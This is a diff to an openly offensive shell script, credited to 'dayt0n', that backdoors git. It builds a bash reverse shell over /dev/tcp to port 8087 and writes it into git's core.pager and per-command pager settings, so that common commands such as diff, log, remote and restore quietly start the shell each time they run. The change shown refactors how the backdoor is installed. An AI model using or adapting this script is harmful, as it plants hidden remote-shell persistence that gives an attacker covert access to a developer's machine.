@@ -13,6 +13,7 @@
 # made by dayt0n (c) 2022
 
 REVSHELL="(/bin/bash -i >& /dev/tcp/127.0.0.1/8087 0>&1 &) 2> /dev/null"
+PAGER_STR="less -FRX; ${REVSHELL}"
 
 COMMANDS=(
     "init"
@@ -32,15 +33,12 @@ COMMANDS=(
     "remote"
     "switch"
     "restore"
+    "diff"
+    "log"
 )
 
-PAGER_STR="cat; ${REVSHELL}"
 git config core.pager "$PAGER_STR"
 for CMD in "${COMMANDS[@]}"; do
     echo "Backdooring git $CMD..."
     git config pager.$CMD true
 done
-echo "Backdooring git diff..."
-git config pager.diff "less; ${REVSHELL}"
-echo "Backdooring git log..."
-git config pager.log "less; ${REVSHELL}"
